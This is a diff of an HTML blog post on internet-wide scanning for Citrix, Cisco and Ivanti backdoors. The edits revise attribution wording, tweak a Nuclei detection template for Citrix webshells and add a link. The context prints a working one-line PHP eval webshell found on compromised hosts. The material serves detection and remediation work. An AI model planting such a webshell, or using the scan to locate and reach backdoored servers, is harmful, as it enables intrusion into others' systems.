@@ -344,7 +344,7 @@ Each case shows that compromise can survive remediation, and why defenders must 
 <p>To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00030/">DIVD-2023-00030</a> for the vulnerability and <a href="https://csirt.divd.nl/cases/DIVD-2023-00033/">DIVD-2023-00033</a> for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.</p>
 
 <h3 id="scanning-for-the-backdoors">Scanning for the Backdoors</h3>
-<p>The first backdoor is publicly attributed to criminals. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, our investigation focused on the criminal shell. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>
+<p>The first vulnerability had significant activity around it and many different backdoors. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, it is unclear whether the shell we investigated was criminal or nation-state. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
 </code></pre></div></div>
@@ -397,10 +397,10 @@ Each case shows that compromise can survive remediation, and why defenders must 
 <span class="na">http</span><span class="pi">:</span>
   <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
     <span class="na">path</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/{{uri}}"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{filename}}"</span>
     
     <span class="na">payloads</span><span class="pi">:</span>
-      <span class="na">uri</span><span class="pi">:</span>
+      <span class="na">filename</span><span class="pi">:</span>
         <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
     
     <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
@@ -413,7 +413,7 @@ Each case shows that compromise can survive remediation, and why defenders must 
         <span class="na">part</span><span class="pi">:</span> <span class="s">header</span>
         <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
         <span class="na">regex</span><span class="pi">:</span>
-          <span class="pi">-</span> <span class="s1">'</span><span class="s">Content-Length:'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">(?i)content-length:'</span>
 </code></pre></div></div>
 <p><span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span></p>
 
@@ -592,7 +592,7 @@ Each case shows that compromise can survive remediation, and why defenders must 
 <p>All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after.</p>
 
 <h2 id="ivanti-connect-secure---cve-2024-21893">Ivanti Connect Secure - CVE-2024-21893</h2>
-<p>A few months later, on January 31st, 2024, Ivanti released fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. The first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who dubbed it the DSLog backdoor.</p>
+<p>A few months later, on January 31st, 2024, Ivanti <a href="https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways">released</a> fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. One of the first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who named it the DSLog backdoor.</p>
 
 <p>As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.</p>
 
